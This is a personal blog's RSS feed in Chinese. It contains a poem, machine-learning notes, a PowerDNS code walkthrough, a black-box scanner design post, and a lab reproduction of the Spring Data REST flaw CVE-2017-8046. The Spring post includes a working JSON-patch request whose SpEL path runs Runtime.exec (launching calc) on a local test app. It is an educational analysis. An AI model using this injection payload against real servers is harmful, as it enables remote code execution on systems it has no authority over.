<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sera Wang</title><link>https://sera.wang/</link><description>Recent content on Sera Wang</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 28 Aug 2021 23:09:30 +0800</lastBuildDate><atom:link href="https://sera.wang/index.xml" rel="self" type="application/rss+xml"/><item><title>飞地与海岛</title><link>https://sera.wang/p/%E9%A3%9E%E5%9C%B0%E4%B8%8E%E6%B5%B7%E5%B2%9B/</link><pubDate>Sat, 28 Aug 2021 23:09:30 +0800</pubDate><guid>https://sera.wang/p/%E9%A3%9E%E5%9C%B0%E4%B8%8E%E6%B5%B7%E5%B2%9B/</guid><description>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20210828231316.png" alt="Featured image of post 飞地与海岛" />&lt;p>他美好的记忆都在陆地之外——&lt;/p>
&lt;p>在飞地，在海岛&lt;/p>
&lt;p>飞地上的人弹琴、爬山、做木匠&lt;/p>
&lt;p>海岛上的人跳舞、制作船帆、吹海螺&lt;/p>
&lt;p>飞地上的树木会说话&lt;/p>
&lt;p>海岛上的微风会低语&lt;/p>
&lt;p>在甲板上入睡&lt;/p>
&lt;p>梦里看见了一生的全部意义&lt;/p>
&lt;p>Sera&lt;/p>
&lt;p>2021-08-28&lt;/p></description></item><item><title>机器学习 - 入门</title><link>https://sera.wang/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/</link><pubDate>Sat, 30 May 2020 11:04:06 +0000</pubDate><guid>https://sera.wang/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E5%85%A5%E9%97%A8/</guid><description>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20210801163900.png" alt="Featured image of post 机器学习 - 入门" />&lt;h1 id="相关资料">相关资料&lt;/h1>
&lt;h2 id="课程">课程&lt;/h2>
&lt;p>Machine Learning - Andrew Ng &lt;a class="link" href="https://www.coursera.org/learn/machine-learning/home/welcome" target="_blank" rel="noopener"
>课程地址&lt;/a>&lt;/p>
&lt;h2 id="书籍">书籍&lt;/h2>
&lt;p>《Python机器学习》— Sebastian Raschka&lt;/p>
&lt;h2 id="师兄当年安利">师兄当年安利&lt;/h2>
&lt;p>《数学之美》— 吴军&lt;/p>
&lt;p>一些振奋人心的话和介绍&lt;/p>
&lt;blockquote>
&lt;p>无需多言，大家都已知道，机器学习已发展成为当前最能激发人们兴趣的技术之一。出于各种考虑，Google、Facebook、Apple、Amazon、IBM等众多公司都投入了巨资用于机器学习理论和应用的研究。机器学习看起来已经成为当前的一个流行语，但这绝对不是炒作。这一令人兴奋的技术为我们带来了全新的可能，并已成为我们日常生活中不可或缺的一部分。例如，与智能手机的语音助手对话、向客户推荐合适的商品、防止信用卡诈骗、过滤垃圾邮件，以及检测与诊断疾病等，这样的例子不胜枚举。—— Sebastian Raschka&lt;/p>
&lt;/blockquote>
&lt;h1 id="python机器学习">Python机器学习&lt;/h1>
&lt;h2 id="第一章-机器学习">第一章 机器学习&lt;/h2>
&lt;h3 id="机器学习的概念">机器学习的概念&lt;/h3>
&lt;p>当前的时代拥有大量的结构化和非结构化的数据，20世纪下半叶，机器学习逐渐演化为人工智能的一个分支，其目的是通过对&lt;strong>自学习算法&lt;/strong>的开发，从数据中获取知识，进而对&lt;strong>未来&lt;/strong>进行预测。与传统的通过大量数据分析然后人工推导规则（如WAF规则）并构造模型不同，机器学习提供了一种&lt;strong>从数据中获取知识的方法，同时能够逐步提高预测模型的性能，并将模型应用于基于数据驱动的决策中去&lt;/strong>。&lt;/p>
&lt;h3 id="机器学习的三种方法">机器学习的三种方法&lt;/h3>
&lt;h4 id="监督学习---supervised-learning">监督学习 - Supervised Learning&lt;/h4>
&lt;h5 id="简介">简介&lt;/h5>
&lt;p>监督学习的目的是使用有类标的&lt;strong>训练数据&lt;/strong>构建模型，我们可以使用经训练得到的&lt;strong>模型&lt;/strong>对未来数据进行&lt;strong>预测&lt;/strong>。&lt;/p>
&lt;p>&lt;strong>监督&lt;/strong>是指训练数据集中的每个样本均有一个已知的输出项。&lt;/p>
&lt;blockquote>
&lt;p>示例：过滤垃圾邮件&lt;/p>
&lt;/blockquote>
&lt;p>基于&lt;strong>有类标&lt;/strong>的电子邮件样本库（每一个样本都已被准确地标记是否为垃圾邮件），可以使用监督学习算法训练生成一个判定模型，用来&lt;strong>判定一封新的电子邮件是否为垃圾邮件&lt;/strong>。&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20200530120406.png" alt="监督学习示例" />&lt;/p>
&lt;p>类似过滤垃圾邮件的这类问题也被称为&lt;strong>分类&lt;/strong>（classfication），监督学习的另一个子类是&lt;strong>回归&lt;/strong>（regression）。&lt;/p>
&lt;h5 id="利用分类对类标进行预测">利用分类对类标进行预测&lt;/h5>
&lt;p>&lt;strong>分类&lt;/strong>是基于对过往类标已知示例的观察与学习，实现对新样本类标的预测。这些类标是离散的、无序的值，它们可以视为样本的组别信息（group membership）。上文检测垃圾邮件的例子是一个典型的&lt;strong>二类别分类&lt;/strong>（binary classification）任务，机器学习算法会生成一系列的规则用以判定邮件是否属于垃圾邮件。&lt;/p>
&lt;p>然而，&lt;strong>类标集合并非一定是二类别分类的&lt;/strong>。通过监督学习算法构造的预测模型可以将训练样本库中出现的任何类标赋给一个尚未被标记的新样本。&lt;/p>
&lt;p>比如手写字符识别就是一个典型的&lt;strong>多类别分类&lt;/strong>（multi-class classfication）的例子。我们可以将字母表中每个字母的多个不同的手写样本收集起来作为训练数据集。此时，若用户给出一个新的手写字符，我们的预测模型能够以一定的准确率将其判定为字母表中的某个字母。然而，如果我们的训练样本库中没有出现0～9的数字字符，那么模型将无法正确辨别任何输入的数字。&lt;/p>
&lt;p>下图通过一个具有30个训练样本的示例说明二类别分类任务的概念：15个样本被标记为负类别（negative class - 圆圈）；15个被标记为正类别（positive class - 加号）。此时，我们的数据集是二维的，这意味着每个样本都有两个与其关联的值：x1和x2。现在，我们可以通过监督学习算法获得一条规则，并将其表示为一条黑色虚线标识的分界线。可以根据给定的x1、x2值将新样本划分到某个类别中。&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20200530124134.png" alt="" />&lt;/p>
&lt;h5 id="使用回归预测连续输出值">使用回归预测连续输出值&lt;/h5>
&lt;p>回归分析（regression analysis）的目的是针对连续型输出变量进行预测。在回归分析中，数据会给出大量的自变量（解释变量）和因变量（输出结果），通过尝试寻找这两种变量之间的关系，就能够预测输出变量。&lt;/p>
&lt;p>例如，如果我们想预测学生的数学考试成绩，如果花费在学习上的时间和最终的考试成绩有关联，则可以将其作为训练数据来训练模型，以根据学习时间预测将来要参加考试的学生的成绩。&lt;/p>
&lt;p>下图用图例阐述了&lt;strong>线性回归&lt;/strong>（linear regression）的概念：给定一个自变量x和因变量y，拟合一条直线使得样例数据点与拟合直线之间的距离最短，最常用的就是采用平均平方距离来计算。这样，我们就可以通过对样本数据的训练来获得拟合直线的截距和斜率，从而对新的输入变量值所对应的输出变量值进行预测。&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20200530141632.png" alt="" />&lt;/p>
&lt;h4 id="强化学习---reinforcement-learning">强化学习 - Reinforcement Learning&lt;/h4>
&lt;p>强化学习的目的是构建一个&lt;strong>系统&lt;/strong>（Agent），在于&lt;strong>环境&lt;/strong>（environment）交互的国策和观念中提高系统的性能。环境的当前状态信息中通常包含一个&lt;strong>反馈&lt;/strong>（reward）信号，我们可以将强化学习视为与监督学习相关的一个领域。然而，在强化学习中，这个反馈值不是一个确定的类标或连续的值，而是一个通过反馈函数产生的对当前系统行为的评价。通过与环境的交互，Agent可以通过强化学习来得到一系列行为，通过探索性的试错或者借助精心设计的激励系统使得正向反馈最大化。&lt;/p>
&lt;p>一个最常见的例子就是围棋对弈的游戏（还有Dota的Open AI）。在此，Agent根据棋盘上的当前局势（environment）决定落子的位置，而游戏结束时胜负的判定可以作为激励信号。&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20200530142503.png" alt="" />&lt;/p>
&lt;h4 id="无监督学习---unsupervised-learning">无监督学习 - Unsupervised Learning&lt;/h4>
&lt;p>无监督学习的目的是在没有已知输出变量和反馈函数指导的情况下提取有效信息来探索数据的整体结构。&lt;/p>
&lt;h5 id="通过聚类发现数据的子群">通过聚类发现数据的子群&lt;/h5>
&lt;p>&lt;strong>聚类&lt;/strong>是一种探索性数据分析技术。在没有任何相关先验信息的情况下，它可以帮助我们将数据划分为有意义的小的组别（簇，cluster）。对数据进行分析时，生成的每个簇中其内部成员之间具有一定的相似度，而与其它簇中的成员则具有较大的不同，这也是为什么聚类有时被称为&lt;strong>无监督分类&lt;/strong>。&lt;/p>
&lt;h5 id="数据压缩中的降维">数据压缩中的降维&lt;/h5>
&lt;p>&lt;strong>数据降维&lt;/strong>（dimensionality reduction）是无监督学习的另一个子域。通常，我们面对的数据都是高维的（每一次采样都会获取大量的样本值），这就对有限的数据存储空间以及机器学习算法性能提出了挑战。无监督降维是数据特征预处理时常用的技术，用于清除数据中的噪声，它能够在最大程度保留相关信息的情况下将数据压缩到一个维度较小的子空间，但同时也可能会降低某些算法在准确性方面的性能。&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>构建机器学习系统的路线：&lt;/p>
&lt;ol>
&lt;li>数据预处理&lt;/li>
&lt;li>选择预测模型并进行训练&lt;/li>
&lt;li>模型验证与使用未知数据进行预测&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="第二章-机器学习分类算法">第二章 机器学习分类算法&lt;/h2>
&lt;p>本章将介绍最早以算法方式描述的分类机器学习算法：&lt;strong>感知器&lt;/strong>（perceptron）和&lt;strong>自适应线性神经元&lt;/strong>（adaptive linear neuron）。并实现一个感知器。通过训练使其具备对数据集中数据进行分类的能力。&lt;/p>
&lt;h3 id="罗森布拉特感知器">罗森布拉特感知器&lt;/h3>
&lt;p>&lt;strong>罗森布拉特感知器&lt;/strong>是由罗森布拉特（Frank Rossenblatt）基于1943年沃伦·麦卡洛可（Warren McCullock）和沃尔特·皮茨（Walter Pitts）提出的麦卡洛可-皮茨神经元（MCP）提出的感知器学习法则。&lt;/p>
&lt;blockquote>
&lt;p>麦卡洛可和皮茨将神经细胞描述为一个具备二进制输出的逻辑门。树突接受多个输入信号，如果累加的信号超过某一阈值，经细胞体的整合就会生成一个输出信号，并通过轴突进行传递。&lt;/p>
&lt;/blockquote>
&lt;p>罗森布拉特感知器可以自动通过优化得到权重系数，此系数与输入值的乘积决定了神经元是否被激活。在监督学习与分类中，类似算法可用于预测样本所属的类别。&lt;/p>
&lt;p>可以把这个问题看作一个二值分类的任务，我们把两类分别记为1（正类别）和-1（负类别）。我们定义一个&lt;strong>激励函数&lt;/strong>（activation function）$$\phi (z)$$&lt;/p>
&lt;p>，它以特定的输入值$x$与相应的权值向量$w$的线性组合作为输入，其中，$z$也被称作净输入（$z=w_1x_1+&amp;hellip;+w_mx_m$）:
$$
w=\left[
\begin{matrix}
w_1 \\
. \\
. \\
. \\
w_m
\end{matrix}
\right],
x=\left[
\begin{matrix}
x_1\\
.\\
.\\
.\\
x_m
\end{matrix}
\right]
$$
此时，对于一个特定样本$x(i)$的激励，也就是$\phi(z)$的输出，如果其值大于预设的阈值$\phi$ ，我们将其划分到1类，否则为-1类。在感知器算法中，激励函数是一个简单的分段函数。
$$
\phi(z)=\{ 1,\ \ \ {if}\ \ \ z &amp;gt; 0 \\
\ \{ -1, {其它}
$$
为了简单起见，我们可以把阈值$\phi$移到等式的左边，并增加一个初始项权重记为$w_0=-\phi$且设$x_0=1$，这样我们就可以把$z$写成一个更加紧凑的形式：
$$
z=w_0x_0+w_1x_1+&amp;hellip;+w_mx_m=w^Tx
$$&lt;/p></description></item><item><title>【WIP】开源DNS服务器源码解析</title><link>https://sera.wang/p/what_powerdns_do/</link><pubDate>Wed, 18 Sep 2019 20:32:56 +0000</pubDate><guid>https://sera.wang/p/what_powerdns_do/</guid><description>&lt;p>我们选择一个开源的DNS服务器，这里笔者选择的是 &lt;a class="link" href="https://github.com/PowerDNS/pdns" target="_blank" rel="noopener"
>PowerDNS&lt;/a>，也是很多组织或企业搭建DNS服务的一个常见选择。&lt;/p>
&lt;h2 id="编译安装">编译安装&lt;/h2>
&lt;p>暂略&lt;/p>
&lt;p>分支：rec-4.0.x&lt;/p>
&lt;h2 id="递归解析-源码">递归解析 源码&lt;/h2>
&lt;p>分析的几点，&lt;/p>
&lt;ol>
&lt;li>
&lt;p>开启Lua与否的区别&lt;/p>
&lt;/li>
&lt;li>&lt;/li>
&lt;/ol>
&lt;p>入口看 pdns_recursor.cc 文件，main() 函数主要读取各种配置以及各种初始化。&lt;/p>
&lt;h3 id="startdoresolve-函数">startDoResolve 函数&lt;/h3>
&lt;h4 id="1-line-690-760">1. Line 690-760&lt;/h4>
&lt;p>![image-20200110211550470](/Users/wangwenqi/Library/Application Support/typora-user-images/image-20200110211550470.png)&lt;/p>
&lt;p>主要初始化一些变量，介绍一部分。&lt;/p>
&lt;p>edns是rfc里用来储存DNS额外信息（客户端IP）。默认不开。&lt;/p>
&lt;p>pw是 DNSPacketWriter，顾名思义，用来写返回包的。&lt;/p>
&lt;p>740 - 746行 设置了一些DNS包的标志位。&lt;/p>
&lt;p>下面初始化了一个SyncRes类（核心），初始化了Lua引擎&lt;/p>
&lt;p>756行 因为DNSSEC的默认值是 process-no-validate，所以默认会进行DNSSEC行为。&lt;/p>
&lt;h4 id="2-line-779-821">2. Line 779-821&lt;/h4>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20200110212045.png" alt="" />&lt;/p>
&lt;p>781行 shouldNotValidate变量设置默认值false&lt;/p>
&lt;h4 id="3-line-822-973">3. Line 822-973&lt;/h4>
&lt;p>到了一个if判断。这是关键位置。&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20200110212817.png" alt="" />&lt;/p>
&lt;p>if的条件是 没开Lua hook 或者 preresolve 这个Lua hook 直接return false，则执行。&lt;/p>
&lt;p>先进行了一次 wantsRPZ (默认true)，根据不同policy进行相应处理。&lt;/p>
&lt;p>下面的try catch会进入一个 beginResolve方法，即进行&lt;strong>递归解析，先不跟进&lt;/strong>。&lt;/p>
&lt;p>874行 判断res，是否等于 -2。代码会switch policy的值进行不同操作。&lt;/p>
&lt;p>918行 如果res == RCode::NoError ，遍历结果，按情况会执行一个 nodata hook.&lt;/p>
&lt;p>935行 又执行了一次wantsRPZ&lt;/p>
&lt;h4 id="4-line-974-1105">4. Line 974-1105&lt;/h4>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20200112164805.png" alt="" />&lt;/p>
&lt;p>975 判断res值是否等于DROP，是则直接return。&lt;/p>
&lt;p>981 如果错误会打Log&lt;/p>
&lt;p>993 判断res值是否等于 -1，是则返回包设置为Servfail&lt;/p>
&lt;p>若res不等于 -1，写返回的rcode（设置为res值）&lt;/p>
&lt;p>1002 若需要validate（执行lua hook后则不需要，这是一个区分点），则会进行使用validateRecords(ret)验证，根据state值执行不同操作。&lt;/p>
&lt;p>1057 结果不为空，会调用 orderAndShuffle(ret)&lt;/p>
&lt;p>DNSComboWriter类似一个生产者，获取请求的 域名 d_qname 和 请求类型 d_qtype，下面是处理EDNS。&lt;/p>
&lt;p>再看下面&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20191217204919.png" alt="" />&lt;/p>
&lt;p>738行，初始化了一个DNSPacketWriter，用来写返回的packet。&lt;/p>
&lt;p>750行，初始化了解析器。用来做递归解析的。&lt;/p>
&lt;p>752行， 设置了Lua引擎指针 t_pdl，pdns通过Lua的形式提供了各种hook。&lt;/p>
&lt;p>再往下看，784行初始化了res，即返回码，服务端和客户端都会根据这个判断请求状态。如 Rcode为 SERVFAIL 时，很多开源的dns库就会报错。&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20191218103654.png" alt="" />&lt;/p>
&lt;p>813行，会调用lua的一个hook，prerpz()方法。&lt;/p>
&lt;p>往下看&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20191218105837.png" alt="" />&lt;/p>
&lt;p>823行，会调用Lua Hook，preresolve方法，在每次递归解析前会执行这个Hook。&lt;/p>
&lt;p>看if条件，如果没有启用 Lua 或者 preresolve 方法返回了false，会进行默认解析。&lt;/p>
&lt;p>825 - 860 行，看默认解析，是 RPZ 和 policy 的判断，这块暂略。不同policy会直接影响解析结果。&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20191218110645.png" alt="" />&lt;/p>
&lt;p>try的块中，可以看到默认解析会调用 syncres.cc文件中的SyncRes类的beginResolve方法，shouldNotValidate的值是用来判断是否OOB的（OOB暂略）。中间报错会直接返回SERVFAIL。&lt;/p>
&lt;p>暂时不跟进，主要看Lua，往下看&lt;/p>
&lt;p>873行，判断返回码res是否等于-2（-2表示命中了过滤引擎的策略）&lt;/p>
&lt;blockquote>
&lt;p>syncres.cc&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20191218111229.png" alt="" />&lt;/p>
&lt;p>同之前一样，下面就会根据不同policy进行处理。&lt;/p>
&lt;p>往下看，默认解析最后，如果没有报错的话，会执行Lua Hook，nodata方法&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20191218111629.png" alt="" />&lt;/p>
&lt;p>第二个if 执行的是 nxdomain hook。（NXDOMAIN 暂略）&lt;/p>
&lt;p>最后再调用 Lua Hook，postresolve方法。（即解析完后执行）&lt;/p>
&lt;p>往下看，如果返回码res 不等于-1，都会执行&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20191218113239.png" alt="" />&lt;/p>
&lt;p>如果shouldNotValidate为true，即比如postresolve 中返回了false才会执行这段code。&lt;/p>
&lt;p>往下看，&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/20191218113958.png" alt="" />&lt;/p>
&lt;p>会调用validateRecords方法（判断CSPF，暂略）判断解析记录的状态。&lt;/p>
&lt;p>然后根据不同状态设置ad码。&lt;/p>
&lt;p>下面是写到返回的packet中。&lt;/p></description></item><item><title>如何实现一个黑盒扫描器?</title><link>https://sera.wang/p/blackbox-scanner/</link><pubDate>Sun, 15 Sep 2019 11:02:51 +0000</pubDate><guid>https://sera.wang/p/blackbox-scanner/</guid><description>&lt;h2 id="整体架构">整体架构&lt;/h2>
&lt;p>黑盒扫描的目的主要有两个：&lt;/p>
&lt;ol>
&lt;li>资产发现&lt;/li>
&lt;li>漏洞扫描&lt;/li>
&lt;/ol>
&lt;p>扫描器的效率和表现方面，单机可以用多进程+协程的方式去提qps，资源够也可以使用分布式，如：kafka / celery（后者感觉更重一点，虽然能帮你做很多事情）&lt;/p>
&lt;p>我踩坑设计了一个主要依靠redis做任务的分发和pull执行（主要想糙快猛地实现），现在看来效率的确是因为架构设计有问题导致整体表现不尽如人意。&lt;/p>
&lt;p>自己后来想的一个理想的架构设计：&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/Lark20190916-184509.png" alt="" />&lt;/p>
&lt;h2 id="子域名搜集">子域名搜集&lt;/h2>
&lt;p>子域名搜集是信息搜集里很关键的一步，因为它拓展了很大一部分的攻击面。下面是我对子域名搜集的实践。&lt;/p>
&lt;p>我用python实现了一个子域名搜集工具，主要用到的方法有：&lt;/p>
&lt;ol>
&lt;li>基于字典&lt;/li>
&lt;li>开源情报 和 搜索引擎&lt;/li>
&lt;li>IP反查&lt;/li>
&lt;li>TLS证书获取&lt;/li>
&lt;/ol>
&lt;p>我使用的前者，部署最方便。&lt;/p>
&lt;p>整体架构：&lt;/p>
&lt;p>&lt;img src="https://ser4wang.oss-cn-beijing.aliyuncs.com/Lark20190916-184731.png" alt="" />&lt;/p>
&lt;p>这是单机跑的非理想情况，4核8g，60%cpu，800-1500qps&lt;/p>
&lt;p>几个大小问题：&lt;/p>
&lt;ol>
&lt;li>域名泛解析&lt;/li>
&lt;li>域名去重&lt;/li>
&lt;li>比较依赖redis&lt;/li>
&lt;/ol>
&lt;p>泛解析有两种解决方式，一种是ip-domain的hash map超过了阈值，最后做清洗；另一种是查完了，就做一次 &amp;lt;随机前缀.目标域名&amp;gt;的查询，判断是否存在，这样（和清洗一个道理）。实际做下来是1方便，因为第二种方式，如果在做判断的同时，有其他做dns query的查到了结果，就会被绕过存入data。&lt;/p>
&lt;p>域名去重是因为首先引入了开源情报和搜索引擎，还有后续得到的CNAME啊，NS啊之类的，不做去重，任务队列可能就大了两三倍。我去重主要依赖redis的set，这样又回引入大key问题，解决大key，可以根据域名的级数（多少个&amp;lt;.&amp;gt;）分去重set，也可以大key分小key，因为并发，暂时没想到好的设计，优化考虑用布隆过滤器去做去重。&lt;/p>
&lt;p>依赖redis，前面有提到，后面就不赘述了。&lt;/p>
&lt;h2 id="敏感文件扫描">敏感文件扫描&lt;/h2>
&lt;p>这个我实现的很简单，主要看了github上几个老前辈的实现，总结了一下，可以这样做：&lt;/p>
&lt;ol>
&lt;li>对目标做一次全站链接爬取（需要考虑url去重）&lt;/li>
&lt;li>根据links生成一级级目录&lt;/li>
&lt;li>配合对应字典，做验证。&lt;/li>
&lt;/ol>
&lt;p>其实有了目录+对应漏洞的字典，主要就是验证了。这块同时可以验证的漏洞有很多，除了敏感文件泄漏，还有目录遍历，未授权访问等等。后者可以通过打分策略来做（实现比较low，也可以用图像识别，ML做）。&lt;/p>
&lt;h2 id="漏洞验证">漏洞验证&lt;/h2>
&lt;p>可以找一个社区比较大的（poc贡献多），因为一个是自己写poc需要很多时间。&lt;/p></description></item><item><title>旧文章已封存，重新出发</title><link>https://sera.wang/p/%E6%97%A7%E6%96%87%E7%AB%A0%E5%B7%B2%E5%B0%81%E5%AD%98%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/</link><pubDate>Sun, 01 Sep 2019 16:40:17 +0800</pubDate><guid>https://sera.wang/p/%E6%97%A7%E6%96%87%E7%AB%A0%E5%B7%B2%E5%B0%81%E5%AD%98%E9%87%8D%E6%96%B0%E5%87%BA%E5%8F%91/</guid><description>&lt;p>从大一时租了台腾讯云的学生机用 WordPress 搭了个站点，中间换成了hexo+next 并使用了很长时间，到目前换成了 hugo+Stack，每次折腾都是一个于我而言很重要的时间节点。&lt;/p>
&lt;p>有本书里把“心流”定义为一种将个人精神力完全投注在某种活动上的感觉。我确实地感受过很多次，写码、看书、在西门町的无人街边深深看着夕阳，妙不可言。&lt;/p>
&lt;p>工作用的IM、短视频应用、密集的feed流就很打扰，就很不美，这种从一种无序走向另一种无序的感觉让我难以忍受。毕业到工作的一年时间里因为大小周和自己的原因很少有时间去沉淀自己的想法，于是才有了这次的折腾，想让自己静下来，沉淀些什么。&lt;/p></description></item><item><title>Spring 漏洞总结</title><link>https://sera.wang/p/spring-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</link><pubDate>Sun, 24 Feb 2019 21:14:23 +0800</pubDate><guid>https://sera.wang/p/spring-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</guid><description>&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/19-02-24/974875.png" alt="img" />&lt;/p>
&lt;h1 id="spring-data-rest--rce--cve-2017-8046">Spring Data REST | RCE | CVE-2017-8046&lt;/h1>
&lt;h2 id="漏洞简析">漏洞简析&lt;/h2>
&lt;p>SpEL是独立于spring容器的一个可执行模块。 它使用SpelExpressionParser把字符串解析成表达式，当其中一个方法获取到值之后，表达式就会被执行，getValueType或者setValue会被调用：&lt;/p>
&lt;pre tabindex="0">&lt;code>Expression expr = expressionParser.parseExpression(stringScript);
expr.getValue(); //Execute the code in stringScript
&lt;/code>&lt;/pre>&lt;p>通常，SpEL仅限于内部使用并且stringScript会被程序完全控制。 但如果 stringScript是用户可控的话，那么攻击者就可以在有漏洞的服务器上执行任意代码。&lt;/p>
&lt;p>即：&lt;/p>
&lt;pre tabindex="0">&lt;code>String stringScript = &amp;quot;T(java.lang.Runtime).getRuntime().exec(&amp;quot;+cmd+&amp;quot;).x&amp;quot;;
&lt;/code>&lt;/pre>&lt;p>之后cmd就被执行。&lt;/p>
&lt;p>这就是这个Spring Data REST漏洞的基本原理，Spring Data REST把远程输入的数据解析成SpEL表达式，并且将其解析。&lt;/p>
&lt;h2 id="漏洞复现">漏洞复现&lt;/h2>
&lt;p>使用的项目为 &lt;code>https://github.com/spring-guides/gs-accessing-data-rest.git&lt;/code> 里面的complete，直接用IDEA导入，并修改pom.xml中版本信息为漏洞版本。 1.5.6.RELEASE，然后导入pom.xml&lt;/p>
&lt;ol>
&lt;li>
&lt;p>运行项目&lt;/p>
&lt;/li>
&lt;li>
&lt;p>新建一个people对象&lt;/p>
&lt;pre tabindex="0">&lt;code>POST /people HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Connection: close
Content-type: application/json
Content-Length: 32
{&amp;quot;firstName&amp;quot;:&amp;quot;test1&amp;quot;,&amp;quot;lastName&amp;quot;:&amp;quot;test2&amp;quot;}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>发送payload&lt;/p>
&lt;pre tabindex="0">&lt;code>PATCH /people/1 HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json-patch+json
Content-Length: 256
[{ &amp;quot;op&amp;quot;: &amp;quot;replace&amp;quot;, &amp;quot;path&amp;quot;: &amp;quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,97,108,99}))/lastName&amp;quot;, &amp;quot;value&amp;quot;: &amp;quot;test&amp;quot; }]
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>效果&lt;/p>
&lt;p>&lt;img src="http://77sera.oss-cn-beijing.aliyuncs.com/19-02-24/002851.png" alt="img" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="漏洞分析">漏洞分析&lt;/h2>
&lt;p>第一次分析Java框架的洞。&lt;/p>
&lt;p>payload:&lt;/p>
&lt;blockquote>
&lt;p>[{ “op”: “replace”, “path”: “T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{99,97,108,99}))/lastName”, “value”: “vulhub” }]&lt;/p>
&lt;/blockquote>
&lt;p>首先，客官们先来看看这里&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/277567.png" alt="img" />&lt;/p>
&lt;p>这是函数入口，前三行检测header头和http方法的正确性。&lt;/p>
&lt;p>到了return处，会执行一个 applyPatch()方法，跟进&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/277722.png" alt="img" />&lt;/p>
&lt;p>跟进getPatchOperation方法后会发现，它会调用convert方法，跟进&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/278149.png" alt="img" />&lt;/p>
&lt;p>这里可以看到，payload中的op参数值为”replace”，因此实例化了ReplaceOperation类&lt;/p>
&lt;p>并且入参的path和value是payload中的参数值。&lt;/p>
&lt;p>因此，实际上getPatchOperation方法最后会返回一个XXXOperation类，然后再调用Patch类的apply方法，跟进&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/278773.png" alt="img" />&lt;/p>
&lt;p>我们可以看到 31行调用了 ReplaceOperation的perform方法，跟进&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/278975.png" alt="img" />&lt;/p>
&lt;p>此处调用了setValueOnTarget方法，跟进&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/279199.png" alt="img" />&lt;/p>
&lt;p>setValue方法，但是此时Spel表达式的值已经被替换成了我们的payload，继续跟进&lt;/p>
&lt;p>&lt;img src="https://77sera.oss-cn-beijing.aliyuncs.com/19-02-27/279308.png" alt="img" />&lt;/p>
&lt;p>setValue的实现 到了spring-expression包来了，最终在spring-expression包里解析执行了我们的代码，弹出了计算器。&lt;/p>
&lt;p>解析运行的原理在之前的简析里有分析。 具体SpEL实现，我也很好奇！这块可以期待我们在Spring框架的SpEL处再见！&lt;/p>
&lt;p>谢谢各位客官。&lt;/p></description></item><item><title>Yii2 漏洞总结</title><link>https://sera.wang/p/yii2-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</link><pubDate>Fri, 08 Feb 2019 21:14:23 +0800</pubDate><guid>https://sera.wang/p/yii2-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</guid><description>&lt;blockquote>
&lt;p>欲寻框架之漏洞，必先用其开发一波。———— Rose家的程序喵&lt;/p>
&lt;/blockquote>
